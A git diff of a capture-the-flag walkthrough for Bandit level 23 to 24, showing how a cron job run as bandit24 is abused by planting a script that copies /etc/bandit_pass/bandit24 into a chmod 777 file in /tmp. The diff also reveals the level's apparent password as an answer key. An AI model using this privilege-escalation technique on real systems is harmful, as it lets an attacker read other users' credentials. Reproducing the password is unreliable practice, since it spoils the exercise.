@@ -1,93 +1,139 @@
-# Bandit Level 23 → Level 24
+# Level 23 → 24
 
 ## Task
 
-A program is running automatically at regular intervals from `cron`, the time-based job scheduler. Look in `/etc/cron.d/` for the configuration and see what command is being executed.
+A cron job is running automatically as `bandit24`.
 
-**NOTE:** This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!
-**NOTE 2:** Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…
+The goal is to inspect the cron job and its script, understand how it processes files, and use that behavior to obtain the password for the next level.
 
 ## Commands Used
 
-- `ls -la` — lists files and their permissions.
-- `cat` — displays the contents of a file (also used to write into a file).
-- `mkdir` — creates a new directory.
-- `cd` — changes the current directory.
-- `chmod` — changes file permissions.
-- `touch` — creates an empty file.
-- `cp` — copies files and directories.
+- `ls -la /etc/cron.d/` — lists the available cron jobs.
+- `cat /etc/cron.d/cronjob_bandit24` — displays the cron configuration for `bandit24`.
+- `cat /usr/bin/cronjob_bandit24.sh` — displays the script executed by the cron job.
+- `mkdir /tmp/denisflorinfolder` — creates a temporary working directory.
+- `cat > script.sh` — creates a shell script from terminal input.
+- `chmod 777 script.sh` — gives the script read, write and execute permissions.
+- `touch parola.txt` — creates the file where the password will be written.
+- `chmod 777 parola.txt` — allows `bandit24` to write to the file.
+- `cp script.sh /var/spool/bandit24/foo/` — places the script in the directory monitored by the cron job.
+- `cat parola.txt` — reads the password written by the script.
 
 ## Command Breakdown
 
-First, I inspected the cron jobs configuration:
+First, I inspected the cron jobs:
 
 ```bash
 ls -la /etc/cron.d/
 ```
 
-I identified the configuration related to the next level:
+I found the following entry:
+
+```text
+cronjob_bandit24
+```
+
+I then inspected it:
 
 ```bash
 cat /etc/cron.d/cronjob_bandit24
 ```
 
-The output showed that the cron job executes `/usr/bin/cronjob_bandit24.sh` as the user `bandit24` every minute. Next, I inspected the script itself:
+The important line was:
+
+```text
+* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
+```
+
+This means `/usr/bin/cronjob_bandit24.sh` is executed every minute as the user `bandit24`.
+
+Next, I inspected the script:
 
 ```bash
 cat /usr/bin/cronjob_bandit24.sh
 ```
 
-![Inspecting the cron job and script](screenshots/level23-level24_1.png)
+The important part is:
 
-The script revealed that it changes its directory to `/var/spool/bandit24/foo`, executes any script found inside that belongs to `bandit23`, and then aggressively deletes them using `rm -rf`. 
+```bash
+cd /var/spool/"$myname"/foo || exit
 
-Because my scripts would be deleted immediately and I couldn't write the output there, I created a safe workspace in the `/tmp` directory:
+for i in * .*;
+do
+    owner="$(stat --format "%U" "./$i")"
+    if [ "${owner}" = "bandit23" ] && [ -f "$i" ]; then
+        timeout -s 9 60 "./$i"
+    fi
+    rm -rf "./$i"
+done
+```
+
+Because the script runs as `bandit24`, `whoami` returns `bandit24`, so it processes files placed inside:
+
+```text
+/var/spool/bandit24/foo/
+```
+
+If a file is owned by `bandit23` and is a regular file, the cron job executes it as `bandit24`.
+
+I created a temporary working directory:
 
 ```bash
 mkdir /tmp/denisflorinfolder
 cd /tmp/denisflorinfolder
 ```
 
-![Analyzing the script and creating a workspace](screenshots/level23-level24_2.png)
+Then I created the following script:
 
-Inside my workspace, I created a shell script (`script.sh`) designed to read the password file and redirect its output to a file I own. I used `cat > script.sh` and wrote:
+```bash
+cat > script.sh
+```
 
 ```bash
 #!/bin/bash
 cat /etc/bandit_pass/bandit24 > /tmp/denisflorinfolder/parola.txt
 ```
 
-To ensure the cron job could execute my script and write the output, I set the proper permissions. I created the destination file (`parola.txt`) in advance and granted full permissions (`777`) to both files:
+I made the script executable:
 
 ```bash
 chmod 777 script.sh
+```
+
+I also created a destination file that `bandit24` could write to:
+
+```bash
 touch parola.txt
 chmod 777 parola.txt
 ```
 
-Finally, I copied my script into the directory monitored by the cron job:
+Finally, I copied my script into the directory processed by the cron job:
 
 ```bash
 cp script.sh /var/spool/bandit24/foo/
 ```
 
-After waiting for about a minute for the cron job to execute, I checked my output file:
+After waiting for the cron job to run, I checked the output file:
 
 ```bash
 cat parola.txt
 ```
 
-![Executing the attack and reading the password](screenshots/level23-level24_3.png)
+The script had been executed as `bandit24`, allowing it to read `/etc/bandit_pass/bandit24` and save the password into my temporary directory.
 
-### Note about Privilege Escalation
+## Screenshots
 
-This level demonstrates a classic **Privilege Escalation** vulnerability. The `cron` service runs with the full privileges of `bandit24`. Because it blindly executes any script placed in `/var/spool/bandit24/foo/` without validating its contents, a lower-privileged user (`bandit23`) can plant a malicious script. When `cron` executes it, the script successfully reads `/etc/bandit_pass/bandit24`—a file that `bandit23` normally has no permission to access.
+![Inspecting the cron job](screenshots/level23-level24_1.png)
+
+![Creating and submitting the script](screenshots/level23-level24_2.png)
+
+![Reading the result](screenshots/level23-level24_3.png)
 
 ## Password
 
 <details>
 <summary>Click to reveal</summary>
 
-`[Pune Parola Aici]`
+`hVQMk3lJNsmQ7VF3ubyrNNBom7BOgVXv`
 
 </details>
